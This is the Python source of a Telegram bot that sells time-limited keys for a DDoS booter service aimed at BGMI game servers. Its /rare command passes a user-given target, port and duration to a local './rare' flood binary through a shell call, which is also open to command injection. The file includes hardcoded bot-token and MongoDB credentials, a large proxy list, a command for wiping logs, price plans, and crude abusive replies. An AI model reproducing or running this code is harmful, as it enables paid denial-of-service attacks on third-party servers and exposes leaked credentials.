import telebot
import requests
import subprocess
import datetime
import os
import random
import string
import json
import time
import logging
from aiogram import Bot
import asyncio
from pymongo import MongoClient

# Insert your Telegram bot token here
bot = telebot.TeleBot('7764942096:AAEFuijVb9KwNEXCPzNfPIwbyWj8G3ubiIQ')

# Admin user IDs
admin_id = {"6906270448"}

# MongoDB URL
MONGO_URL = "mongodb+srv://rolex:rolex@rolexowner.csjfh.mongodb.net/?retryWrites=true&w=majority&appName=ROLEXOWNER"

# Connect to MongoDB
client = MongoClient(MONGO_URL)
db = client["users_db"]
users_collection = db["users"]

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 0  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 5
CONSECUTIVE_ATTACKS_COOLDOWN = 10  # in seconds

# Restart settings
MAX_RESTARTS = 5
RESTART_PERIOD = 60  # Seconds

# In-memory storage
users = {}
keys = {}
rare_cooldown = {}
consecutive_attacks = {}

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]


# List of proxies
PROXIES = [
    "https://192.73.244.36:80",
    "https://198.49.68.80:80",
    "https://148.72.140.24:30127",
    "https://209.97.150.167:8080",
    "https://159.65.245.255:80",
    "https://162.223.94.164:80",
    "https://216.137.184.253:80",
    "https://35.185.196.38:3128",
    "https://172.96.117.205:38001",
    "https://50.175.212.77:80",
    "https://50.173.182.90:80",
    "https://50.172.75.127:80",
    "https://50.223.239.167:80",
    "https://50.171.122.30:80",
    "https://50.223.246.237:80",
    "https://50.223.239.175:80",
    "https://50.222.245.40:80",
    "https://50.223.239.177:80",
    "https://50.222.245.41:80",
    "https://50.174.7.158:80",
    "https://50.168.72.122:80",
    "https://50.171.187.50:80",
    "https://50.223.239.168:80",
    "https://50.223.239.161:80",
    "https://50.223.239.160:80",
    "https://50.171.187.51:80",
    "https://50.169.135.10:80",
    "https://50.207.199.86:80",
    "https://50.217.226.44:80",
    "https://50.172.75.122:80",
    "https://50.174.145.9:80",
    "https://50.172.75.120:80",
    "https://50.221.230.186:80",
    "https://50.222.245.47:80",
    "https://198.199.86.11:8080",
    "https://54.67.125.45:3128",
    "https://44.195.247.145:80",
    "https://13.59.156.167:3128",
    "https://18.223.25.15:80",
    "https://3.212.148.199:3128",
    "https://3.21.101.158:3128",
    "https://52.73.224.54:3128",
    "https://44.219.175.186:80",
    "https://50.174.7.153:80",
    "https://50.168.163.179:80",
    "https://50.174.7.154:80",
    "https://50.217.226.45:80",
    "https://50.221.74.130:80",
    "https://50.168.72.118:80",
    "https://50.207.199.87:80",
    "https://50.217.226.40:80",
    "https://50.168.72.115:80",
    "https://50.174.7.155:80",
    "https://50.217.226.46:80",
    "https://50.168.7.250:80",
    "https://50.218.204.103:80",
    "https://50.145.24.176:80",
    "https://50.223.239.173:80",
    "https://50.145.24.181:80",
    "https://24.205.201.186:80",
    "https://13.56.163.250:3128",
    "https://47.251.43.115:33333",
    "https://198.44.255.5:80",
    "https://162.223.94.166:80",
    "https://198.199.70.20:31028",
    "https://66.191.31.158:80",
    "https://13.56.192.187:80",
    "https://172.183.241.1:8080",
    "https://50.222.245.42:80",
    "https://50.168.163.182:80",
    "https://50.168.72.119:80",
    "https://50.239.72.19:80",
    "https://68.185.57.66:80",
    "https://50.145.24.186:80",
    "https://50.144.161.162:80",
    "https://72.169.67.109:87",
    "https://50.223.239.190:80",
    "https://50.223.239.185:80",
    "https://50.168.72.116:80",
    "https://50.231.172.74:80",
    "https://50.174.145.14:80",
    "https://50.222.245.45:80",
    "https://50.222.245.46:80",
    "https://50.144.161.167:80",
    "https://50.223.246.226:80",
    "https://50.172.75.124:80",
    "https://50.168.163.176:80",
    "https://50.174.145.10:80",
    "https://50.169.37.50:80",
    "https://32.223.6.94:80",
    "https://50.172.39.98:80",
    "https://50.175.212.79:80",
    "https://50.174.145.13:80",
    "https://154.208.10.126:80",
    "https://50.172.75.123:80",
    "https://50.174.7.162:80",
    "https://3.12.144.146:3128",
    "https://50.239.72.17:80",
    "https://50.174.7.156:80",
    "https://50.168.163.180:80",
    "https://50.231.110.26:80",
    "https://50.168.163.178:80",
    "https://50.174.7.157:80",
    "https://50.217.226.43:80",
    "https://50.207.199.82:80",
    "https://50.168.72.113:80",
    "https://50.207.199.83:80",
    "https://50.202.75.26:80",
    "https://50.168.163.166:80",
    "https://50.175.212.76:80",
    "https://34.23.45.223:80",
    "https://12.186.205.122:80",
    "https://50.230.222.202:80",
    "https://50.144.166.226:80",
    "https://50.222.245.43:80",
    "https://50.222.245.50:80",
    "https://50.223.239.194:80",
    "https://50.144.168.74:80",
    "https://50.171.177.124:80",
    "https://50.223.239.191:80",
    "https://50.223.38.6:80",
    "https://4.155.2.13:9480",
    "https://50.174.7.152:80",
    "https://50.168.163.177:80",
    "https://50.168.72.117:80",
    "https://68.178.203.69:8899",
    "https://50.239.72.18:80",
    "https://50.217.226.47:80",
    "https://50.207.199.84:80",
    "https://50.174.145.8:80",
    "https://50.168.72.114:80",
    "https://50.168.163.183:80",
    "https://50.207.199.81:80",
    "https://50.168.163.181:80",
    "https://50.239.72.16:80",
    "https://50.223.239.165:80",
    "https://50.217.226.42:80",
    "https://50.174.7.159:80",
    "https://103.170.155.104:3128",
    "https://162.240.75.37:80",
    "https://137.184.121.54:80",
    "https://160.72.98.165:3128",
    "https://192.210.236.54:3128",
    "https://50.223.239.183:80",
    "https://156.239.48.42:3128",
    "https://69.58.9.119:7189",
    "https://173.214.176.84:6055",
    "https://104.165.127.25:3128",
    "https://43.245.116.203:6718",
    "https://156.239.53.234:3128",
    "https://157.52.233.50:5677",
    "https://104.165.169.254:3128",
    "https://104.165.169.218:3128",
    "https://45.41.160.253:6235",
    "https://134.73.70.39:6283",
    "https://192.186.176.160:8210",
    "https://104.207.45.131:3128",
    "https://161.123.93.27:5757",
    "https://172.245.157.99:6684",
    "https://161.123.130.142:5813",
    "https://156.239.52.221:3128",
    "https://104.207.32.96:3128",
    "https://104.165.127.166:3128",
    "https://104.165.127.87:3128",
    "https://104.207.56.116:3128",
    "https://207.244.217.82:6629",
    "https://45.141.81.10:6070",
    "https://156.239.53.254:3128",
    "https://156.239.53.97:3128",
    "https://134.73.69.178:6168",
    "https://104.207.44.40:3128",
    "https://23.228.83.31:5727",
    "https://12.163.95.161:8080",
    "https://38.170.171.133:5833",
    "https://156.239.52.150:3128",
    "https://156.239.53.182:3128",
    "https://147.124.198.205:6064",
    "https://154.16.146.44:80",
    "https://142.111.1.84:5116",
    "https://156.239.49.31:3128",
    "https://172.245.157.171:6756",
    "https://206.206.64.212:6173",
    "https://206.206.122.34:5665",
    "https://107.179.114.75:5848",
    "https://156.239.52.138:3128",
    "https://156.239.50.229:3128",
    "https://104.207.35.225:3128",
    "https://107.173.137.249:6503",
    "https://134.73.64.15:6300",
    "https://156.239.49.201:3128",
    "https://134.73.65.97:6649"
]

def get_random_proxy():
    return random.choice(PROXIES)

# Example of making a request with a proxy
def make_proxied_request():
    proxy = get_random_proxy()
    proxies = {
        "http": proxy,
        "https": proxy,
    }

 # Example request, you can replace this with your actual API call
    try:
        response = requests.get('https://api.telegram.org/bot7764942096:AAEFuijVb9KwNEXCPzNfPIwbyWj8G3ubiIQ/getMe', proxies=proxies)
        print(response.json())  # Print the response for debugging
    except Exception as e:
        print(f"Error: {e}")

# Read users and keys from files initially
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "𝐋𝐨𝐠𝐬 𝐰𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝"
            else:
                file.truncate(0)
                return "𝐅𝐮𝐜𝐤𝐞𝐝 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲✅"
    except FileNotFoundError:
        return "𝐋𝐨𝐠𝐬 𝐖𝐞𝐫𝐞 𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

def generate_key(length=11):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 3:
            try:
                time_amount = int(command[1])
                time_unit = command[2].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"𝐋𝐢𝐜𝐞𝐧𝐬𝐞: {key}\n𝐄𝐬𝐩𝐢𝐫𝐞𝐬 𝐎𝐧: {expiration_date}\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐅𝐨𝐫 1 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 "
            except ValueError:
                response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐒𝐩𝐞𝐜𝐢𝐟𝐲 𝐀 𝐕𝐚𝐥𝐢𝐝 𝐍𝐮𝐦𝐛𝐞𝐫 𝐚𝐧𝐝 𝐮𝐧𝐢𝐭 𝐨𝐟 𝐓𝐢𝐦𝐞 (hours/days)."
        else:
            response = "𝐔𝐬𝐚𝐠𝐞: /genkey <amount> <hours/days>"
    else:
        response = "𝐎𝐧𝐥𝐲 𝐏𝐚𝐩𝐚 𝐎𝐟 𝐛𝐨𝐭 𝐜𝐚𝐧 𝐝𝐨 𝐭𝐡𝐢𝐬"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        key = command[1]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅𝐊𝐞𝐲 𝐫𝐞𝐝𝐞𝐞𝐦𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲! 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐫𝐚𝐧𝐭𝐞𝐝 𝐔𝐧𝐭𝐢𝐥𝐥: {users[user_id]}"
        else:
            response = "𝐄𝐱𝐩𝐢𝐫𝐞 𝐊𝐞𝐘 𝐌𝐚𝐭 𝐃𝐚𝐚𝐋 𝐋𝐚𝐰𝐝𝐞 ."
    else:
        response = "𝐔𝐬𝐚𝐠𝐞: /redeem <key>"

    bot.reply_to(message, response)
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User "
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username }\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")


@bot.message_handler(commands=['rare'])
def handle_rare(message):
    user_id = str(message.chat.id)
    
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if datetime.datetime.now() > expiration_date:
            response = "❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐆𝐎𝐓 𝐅𝐔𝐜𝐤𝐞𝐝 𝐆𝐄𝐍 𝐧𝐄𝐰 𝐊𝐞𝐘 𝐀𝐧𝐝 𝐫𝐞𝐝𝐞𝐞𝐌-> using /redeemk <key> ❌"
            bot.reply_to(message, response)
            return
        
        if user_id not in admin_id:
            if user_id in rare_cooldown:
                time_since_last_attack = (datetime.datetime.now() - rare_cooldown[user_id]).seconds
                if time_since_last_attack < COOLDOWN_TIME:
                    cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                    response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐮𝐧𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝  /rare 𝐔𝐬𝐞 𝐤𝐫𝐧𝐚."
                    bot.reply_to(message, response)
                    return
                
                if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                    if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                        cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                        response = f"𝐖𝐚𝐢𝐭 𝐊𝐫𝐥𝐞 𝐋𝐮𝐧𝐝𝐞 {cooldown_remaining} 𝐒𝐞𝐜𝐨𝐧𝐝 𝐛𝐚𝐚𝐝 𝐆𝐚𝐧𝐝 𝐦𝐚𝐫𝐰𝐚 𝐥𝐞𝐧𝐚 𝐝𝐨𝐨𝐛𝐚𝐫𝐚."
                        bot.reply_to(message, response)
                        return
                    else:
                        consecutive_attacks[user_id] = 0

            rare_cooldown[user_id] = datetime.datetime.now()
            consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                if port in blocked_ports:
                    bot.send_message(message.chat.id, f"*𝐏𝐎𝐑𝐓 [{port}] 𝐁𝐒𝐃𝐊 𝐘𝐄 𝐏𝐎𝐑𝐓 𝐁𝐋𝐎𝐂𝐊 𝐇𝐀𝐈 𝐘𝐄 𝐆𝐀𝐋𝐀𝐓 𝐏𝐎𝐑𝐓 𝐇𝐀𝐈 𝐋𝐎𝐃𝐄*", parse_mode='Markdown')
                    return
                time_amount = int(command[3])
                if time_amount > 1001:
                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:1000 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                else:
                    record_command_logs(user_id, '/rare', target, port, time_amount)
                    log_command(user_id, target, port, time_amount)
                    start_attack_reply(message, target, port, time_amount)
                    full_command = f"./rare {target} {port} {time_amount} 70"
                    subprocess.run(full_command, shell=True)
                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐇𝐀𝐓𝐀𝐌🎮\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time_amount} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵\n 𝗝𝗢𝗜𝗡 𝗢𝗧𝗛𝗘𝗥𝗪𝗜𝗦𝗘 𝗕𝗔𝗡 = @RARECRACKS ; @freerareddos "
            except ValueError:
                response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
        else:
            response = "✅Usage: /rare <target> <port> <time>"
    else:
        response = "𝐁𝐒𝐃𝐊 𝐆𝐀𝐑𝐄𝐄𝐁 𝐀𝐂𝐂𝐄𝐒𝐒 𝐍𝐀𝐇𝐈 𝐇 𝐓𝐄𝐑𝐏𝐄"

    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 🔥𝐂𝐇𝐔𝐃𝐀𝐈 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥\n\n🎯𝐓𝐀𝐑𝐆𝐄𝐓: {target}\n🚪𝐏𝐎𝐑𝐓: {port}\n⏳𝐓𝐢𝐌𝐄: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐄𝐓𝐇𝐎𝐃: 𝐆𝐔𝐋𝐀𝐁𝐈𝐄 𝐏𝐔𝐒𝐒𝐘🥵"
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "𝐀𝐁𝐄 𝐆𝐀𝐍𝐃𝐔 𝐉𝐈𝐒𝐊𝐀 𝐁𝐎𝐓 𝐇 𝐖𝐀𝐇𝐈 𝐔𝐒𝐄 𝐊𝐑 𝐒𝐊𝐓𝐀 𝐄𝐒𝐄 𝐁𝐀𝐒."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if users:
            response = "𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐑𝐄𝐑 𝐋𝐈𝐒𝐓:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- 𝐔𝐬𝐞𝐫 𝐢𝐝: {user_id} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬 𝐨𝐧 {expiration_date}\n"
        else:
            response = "𝐀𝐣𝐢 𝐋𝐚𝐧𝐝 𝐌𝐞𝐫𝐚"
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐀𝐓"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
                bot.reply_to(message, response)
        else:
            response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
            bot.reply_to(message, response)
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐀𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐋𝐄 𝐑𝐄 𝐋𝐔𝐍𝐃 𝐊𝐄 𝐓𝐄𝐑𝐈 𝐈𝐃: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝐋𝐞 𝐫𝐞 𝐋𝐮𝐧𝐝 𝐤𝐞 𝐘𝐞 𝐭𝐞𝐫𝐢 𝐟𝐢𝐥𝐞:\n" + "".join(user_logs)
                else:
                    response = "𝐔𝐒𝐄 𝐊𝐑𝐋𝐄 𝐏𝐄𝐇𝐋𝐄 𝐅𝐈𝐑 𝐍𝐈𝐊𝐀𝐋𝐮𝐧𝐠𝐚 𝐓𝐄𝐑𝐈 𝐅𝐈𝐋𝐄."
        except FileNotFoundError:
            response = "No command logs found."
    else:
                response = "𝐘𝐄 𝐆𝐀𝐑𝐄𝐄𝐁 𝐄𝐒𝐊𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓 𝐀𝐜𝐜𝐞𝐬𝐬 𝐇𝐈 𝐍𝐀𝐇𝐈 𝐇 𝐄𝐒𝐊𝐄 𝐏𝐀𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''𝐌𝐄𝐑𝐀 𝐋𝐀𝐍𝐃 𝐊𝐀𝐑𝐄 𝐇𝐄𝐋𝐏 𝐓𝐄𝐑𝐈 𝐋𝐄 𝐅𝐈𝐑 𝐁𝐇𝐈 𝐁𝐀𝐓𝐀 𝐃𝐄𝐓𝐀:
💥 /rare 𝐁𝐆𝐌𝐈 𝐊𝐄 𝐒𝐄𝐑𝐕 𝐄𝐑 𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐲𝐈.
💥 /rules: 𝐅𝐨𝐥𝐥𝐨𝐰 𝐞𝐥𝐬𝐞 𝐑𝐚𝐩𝐞.
💥 /mylogs: 𝐀𝐏𝐊𝐄 𝐏𝐎𝐎𝐑𝐀𝐍𝐄 𝐊𝐀𝐀𝐑𝐍𝐀𝐌𝐄 𝐉𝐀𝐍𝐍𝐄 𝐊 𝐋𝐈𝐘𝐄.
💥 /plan: 𝐉𝐢𝐧𝐝𝐠𝐢 𝐦𝐞 𝐊𝐨𝐞 𝐏𝐋𝐀𝐍 𝐧𝐚𝐡𝐢 𝐡𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞.
💥 /redeem <key>: 𝐊𝐞𝐲 𝐑𝐞𝐝𝐞𝐞𝐦 𝐰𝐚𝐥𝐚 𝐂𝐨𝐦𝐦𝐚𝐧𝐝.

🤖 Admin commands:
💥 /genkey <amount> <hours/days>: 𝐓𝐎 𝐌𝐀𝐊𝐄 𝐊𝐄𝐘.
💥 /allusers: 𝐋𝐢𝐒𝐓 𝐎𝐅 𝐂𝐇𝐔𝐓𝐘𝐀 𝐔𝐒𝐄𝐑𝐒.
💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💥 /broadcast <message>: 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐀 𝐌𝐀𝐓𝐋𝐀𝐁 𝐓𝐎 𝐏𝐀𝐓𝐀 𝐇𝐎𝐆𝐀 𝐀𝐍𝐏𝐀𝐃.
'''
    bot.reply_to(message, help_text)

# Command handler for /start
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝐐 𝐫𝐞 𝐂𝐇𝐀𝐏𝐑𝐈, {user_name}! 𝐓𝐡𝐢𝐬 𝐢𝐒 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑𝐒 𝐁𝐨𝐓 𝐒𝐞𝐫𝐯𝐢𝐜𝐞.
🤖𝐀𝐍𝐏𝐀𝐃 𝐔𝐒𝐄 𝐇𝐄𝐋𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃: /help
'''
    bot.reply_to(message, response)

    # Call the proxied request here
    make_proxied_request()  # This will make the API call when the user starts the bot

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐈𝐒 𝐑𝐔𝐋𝐄𝐒 𝐄𝐋𝐒𝐄 𝐘𝐎𝐔𝐑 𝐌𝐎𝐓𝐇𝐄𝐑 𝐈𝐒 𝐌𝐈𝐍𝐄:

1. Don't run too many attacks to avoid a ban from the bot.
2. Don't run 2 attacks at the same time to avoid a ban from the bot.
3. We check the logs daily, so follow these rules to avoid a ban!
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁😂:

VIP 🌟:
-> Attack time: 180 seconds
-> After attack limit: 5 minutes
-> Concurrent attacks: 3

𝐓𝐄𝐑𝐈 𝐀𝐔𝐊𝐀𝐃 𝐒𝐄 𝐁𝐀𝐇𝐀𝐑 💸:
1𝐃𝐚𝐲: 200 𝐫𝐬
3𝐃𝐚𝐲: 450 𝐫𝐬
1𝐖𝐞𝐞𝐤: 800 𝐫𝐬
2𝐖𝐞𝐞𝐤: 1200 𝐫𝐬
𝐌𝐨𝐧𝐓𝐡: 1700 𝐫𝐬 
@RARExxOWNER 💥
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐋𝐞 𝐫𝐞 𝐥𝐮𝐧𝐝 𝐊𝐞 𝐘𝐞 𝐑𝐡𝐞 𝐓𝐞𝐫𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝:

💥 /genkey 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐚 𝐤𝐞𝐲.
💥 /allusers: 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐜𝐡𝐮𝐭𝐲𝐚 𝐮𝐬𝐞𝐫𝐬.
💥 /logs: 𝐒𝐡𝐨𝐰 𝐥𝐨𝐠𝐬 𝐟𝐢𝐥𝐞.
💥 /clearlogs: 𝐅𝐮𝐜𝐤 𝐓𝐡𝐞 𝐥𝐨𝐆 𝐟𝐢𝐥𝐞.
💥 /broadcast <message>: 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐜𝐤𝐞𝐝."
            else:
                response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id :
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:\n\n" + command[1]
            for user_id in users:
                try:
                    bot.send_message(user_id, message_to_broadcast)
                except Exception as e:
                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast message sent successfully to all users 👍."
        else:
            response = "𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"

